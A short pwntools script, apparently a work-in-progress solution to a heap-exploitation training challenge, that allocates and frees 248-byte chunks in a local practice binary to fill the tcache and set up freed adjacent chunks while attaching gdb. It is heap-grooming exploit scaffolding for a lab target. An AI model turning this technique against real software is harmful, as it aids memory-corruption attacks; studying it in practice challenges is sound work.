from pwn import *

binary = './toddlerheap_level8.0_patched'

p = process(binary)
s = '''
b * malloc 
b * free
'''



for i in range(0, 7):
	p.sendline(f"malloc {i} 248")


p.sendline("malloc 7 248")
p.sendline("malloc 8 248")
p.sendline("malloc 9 248")
for i in range(0, 7):
	p.sendline(f"free {i}")

gdb.attach(p, s)

p.sendline("free 7")
p.sendline("free 8")

p.interactive()
